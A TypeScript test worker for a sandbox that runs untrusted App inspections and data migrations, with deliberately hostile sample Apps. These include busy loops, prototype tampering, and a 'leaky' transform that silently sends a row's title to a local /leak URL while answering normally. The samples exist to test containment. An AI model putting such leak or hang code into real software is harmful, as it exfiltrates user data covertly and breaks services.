import { appModuleName, kitModuleName } from "@grasp-os/compiler";
import {
  app as registerApp,
  defineSchema,
  defineTable,
  migration,
  v,
} from "@grasp-os/sdk";
import { inspectApp } from "@grasp-os/sdk/host";
import { versionErrors } from "@grasp-os/shared/app-releases";

import { inspected } from "../../src/app-releases.ts";
import { transformBatch } from "../../src/migration-transform.ts";
import type {
  TransformOutcome,
  TransformRelease,
} from "../../src/migration-transform.ts";
import { SandboxUnavailableError } from "../../src/sandboxed.ts";
import type { SandboxedEnv } from "../../src/sandboxed.ts";

// A seal's inspection and a migration's transform on plain workerd
// (scripts/workerd-sandbox.test.ts): the same `inspected` a seal runs and
// `transformBatch` a migration runs, with `SANDBOX_HOST` bound to the
// sandbox supervisor as on-prem binds it, and no Wrangler or Miniflare.
// Each App below is inspected or transformed on request; the test reads
// how it ended.

/**
 * The SDK's runner as far as an inspection uses it. Everything in the
 * isolate is untrusted, the runner too, so the sandbox can't rely on it.
 */
const runner =
  "export const manifestOfApp = (registered) => JSON.stringify(registered);";

/** Each App's `app.ts`, as its build would leave it. */
const apps: Record<string, string> = {
  good: 'export default { name: "good" };',
  // As in the probe that found the gap: a busy loop inside `manifest()`,
  // through the JSON.stringify the runner calls.
  busyManifest:
    "JSON.stringify = () => { for (;;) {} }; export default { name: 'busy' };",
  busyStartup: "for (;;) {} export default { name: 'busy' };",
  throws:
    "export default { get name() { throw new Error('a broken registration'); } };",
  // Its inspection answers nothing: the App's code replaces the method it's
  // asked through, reaching the inspection module by its name.
  notText: `import * as inspection from "grasp-inspect.js";
queueMicrotask(() => { inspection.Inspect.prototype.manifest = () => undefined; });
export default { name: "nothing" };`,
};

/** How an inspection ended. */
type Outcome =
  | { status: "inspected"; text: string }
  | { status: "refused"; code: string; message: string }
  | { status: "unavailable"; message: string };

const inspect = async (env: SandboxedEnv, app: string): Promise<Outcome> => {
  try {
    const text = await inspected(
      env,
      { [appModuleName("app.ts")]: apps[app] ?? "" },
      { [kitModuleName("@grasp-os/sdk/runner")]: runner }
    );
    return { status: "inspected", text };
  } catch (error) {
    if (error instanceof SandboxUnavailableError) {
      return { status: "unavailable", message: error.message };
    }
    const code = versionErrors.codeOf(error);
    if (code !== undefined) {
      const details: unknown =
        typeof error === "object" && error !== null && "details" in error
          ? error.details
          : {};
      return { status: "refused", code, message: JSON.stringify(details) };
    }
    throw error;
  }
};

/**
 * The SDK's runner as far as a transform uses it: each row through the
 * App's `transform`. Untrusted like everything in the isolate.
 */
const migrationRunner =
  "export const runMigration = (registered, request) => ({ ok: true, rows: request.rows.map((row) => registered.transform(row.fields)) });";

/** Each transforming App's `app.ts`; `PORT` is where a leak would land. */
const transforms: Record<string, string> = {
  good: 'export default { transform: (fields) => ({ ...fields, category: "general" }) };',
  busy: "export default { transform: () => { for (;;) {} } };",
  // Sends the row out as it transforms it, and answers as though it hadn't.
  leaky: `export default { transform: (fields) => {
    fetch("http://127.0.0.1:PORT/leak?title=" + encodeURIComponent(fields.title)).catch(() => {});
    return { ...fields, category: "general" };
  } };`,
};

/** Notes with one migration, `m`, as the SDK registers it. */
const notesManifest = (() => {
  const fields = { title: v.string(), category: v.string() };
  const registered = registerApp({
    name: "Notes",
    schema: defineSchema({ notes: defineTable(fields) }),
    access: { tables: { notes: { read: "owner", write: "owner" } } },
    operations: {},
    screens: [],
    uses: [],
    migrations: [
      migration({
        name: "m",
        table: "notes",
        fromSchema: "a".repeat(64),
        toSchema: "b".repeat(64),
        output: v.object(fields),
        fixtures: [{ row: { title: "Note" } }],
        handler: (_ctx, row) => ({
          title: typeof row.title === "string" ? row.title : "",
          category: "general",
        }),
      }),
    ],
  });
  return inspectApp(registered).manifest;
})();

/** A release of Notes whose `app.ts` is `source`, as `transformBatch` reads it. */
const releaseOf = (source: string): TransformRelease => ({
  app: notesManifest,
  modules: { [appModuleName("app.ts")]: source },
  sdk: { [kitModuleName("@grasp-os/sdk/runner")]: migrationRunner },
});

/** How a transform ended. */
type Transformed =
  | { status: "transformed"; outcome: TransformOutcome }
  | { status: "unavailable"; message: string };

const transform = async (
  env: SandboxedEnv,
  app: string,
  port: string
): Promise<Transformed> => {
  const source = (transforms[app] ?? "").replace("PORT", port);
  try {
    const outcome = await transformBatch(env, releaseOf(source), "m", [
      { id: "n1", owner: "u_owner", fields: { title: "Secret plan" } },
    ]);
    return { status: "transformed", outcome };
  } catch (error) {
    if (error instanceof SandboxUnavailableError) {
      return { status: "unavailable", message: error.message };
    }
    throw error;
  }
};

export default {
  async fetch(request, env) {
    const { pathname, searchParams } = new URL(request.url);
    if (pathname === "/transform") {
      const started = Date.now();
      const outcome = await transform(
        searchParams.has("unbound") ? { ...env, SANDBOX_HOST: undefined } : env,
        searchParams.get("app") ?? "",
        searchParams.get("port") ?? "9"
      );
      return Response.json({ ...outcome, ms: Date.now() - started });
    }
    if (pathname === "/inspect") {
      const started = Date.now();
      // As a deployment off Cloudflare that forgot its sandbox.
      const unbound = searchParams.has("unbound");
      const outcome = await inspect(
        unbound ? { ...env, SANDBOX_HOST: undefined } : env,
        searchParams.get("app") ?? ""
      );
      return Response.json({ ...outcome, ms: Date.now() - started });
    }
    return new Response("core answers");
  },
} satisfies ExportedHandler<SandboxedEnv>;
